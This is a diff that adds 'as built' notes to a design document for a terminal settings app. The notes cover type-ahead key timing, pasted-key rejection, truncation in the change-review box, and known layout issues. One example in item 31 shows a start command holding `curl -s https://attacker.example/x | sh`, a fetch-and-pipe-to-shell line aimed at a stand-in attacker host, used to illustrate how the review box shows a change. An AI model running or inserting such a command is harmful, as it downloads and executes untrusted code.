@@ -437,3 +437,52 @@ the next line, `changed, not deployed (was bun run start)`. The change box at 80
 Tests: `test/app/settings-screen.test.tsx` ("what the next deploy removes", "a long value"),
 `test/app/settings-effects.test.ts`, `test/app/settings-state.test.ts` (`d` carries `shown`),
 `test/app/app-effects.test.ts` ("d on the settings screen deploys only the file it showed").
+
+## As built: after the walkthrough (2026-11-16)
+
+Written by the implementer (quickstart.md, "The pseudo-terminal walkthrough"). Where these notes
+and the sections above differ, these are built. The maintainer reviews them on the real program.
+
+29. **Keys typed before a question is drawn (difference 3).** Item 12's "a key typed ahead never
+    writes" did not hold: `1g` and Enter in one read, then `y` 3 ms later, wrote the file before
+    the question reached the terminal. The app now gives each key the time it was read
+    (`app.tsx`), each stage of a change (typing the value, picking the restart rule, asking y/N)
+    records when the key that opened it was read (`ScreenChange.openedAt`), and a key read within
+    `TYPED_AHEAD_MS` (50 ms, the time single commands throw keys away before a question,
+    `ui/terminal/type-ahead.ts`) of that, the same read included, does nothing. Ctrl-C still
+    quits. Nothing is drawn for it, as for single commands. The app's other screens and questions
+    are unchanged.
+30. **Keys dropped as a paste.** Several keys in one read that hold a line break or a control
+    character are taken for a paste of several lines and dropped, as before; the line under the
+    value now says why, in the warning colour, set in by two: `Use one line with no control
+    character.`, or a plain value's rule `Use one line with no control character, at most 4096
+    characters.`
+31. **The change box (replaces item 27's cut).** When the old and the new value do not both fit,
+    each is cut around where they first differ: from 16 characters before it, after a faint `…`,
+    to the lines that fit, the last ending with `…`. The box names no key: `c` does nothing while
+    it is open. The rows drawn above it, in the same pane, say AS9 without its key:
+    `… 48 more lines`. The question is always drawn. At 80 by 24, a change at the end of the
+    review's start command reads `now  …c bun run start'` and `new  …c bun run start'!`; one in its
+    middle `now  …curl -s https://attacker.example/x | sh ;xxx…` and
+    `new  …curl -s https://example.org/x | sh ;xxx…`, each over two lines.
+32. **AS7 on the status line** is drawn without its backticks, as every line of the app is:
+    `Add one with zekno settings set web.plain.<NAME> <value>.`
+
+| Id | Words |
+|----|-------|
+| AS9 | while a change is open: `… <n> more lines`, with no key |
+
+**Known, left as they are.**
+
+- The words of a setting not set inside a change: `now  no limit` in the text colour and
+  `new  no limit` bold, as the board draws the new value bold ("Words" says dim; the board wins).
+- Where a long sentence wraps, a short last word may stand alone on its line.
+- The "too small" message is feature 004's screen and its layout, uneven at some sizes.
+- At 80 by 24 the window of rows can begin with a section's first row while its heading is above
+  the window, counted in `↑ <n> more`.
+- SH2 on the screen where the commands say SH3 (item 24).
+
+Tests: `test/app/settings-type-ahead.test.tsx` (the real app reading keys from a stand-in terminal:
+the walkthrough's `y` 3 ms after the read that opens the question writes nothing, a `y` once it is
+drawn writes), `test/app/settings-state.test.ts` (each stage held, with times; the dropped keys'
+sentence), `test/app/settings-screen.test.tsx` (the change box at both cuts; AS7).
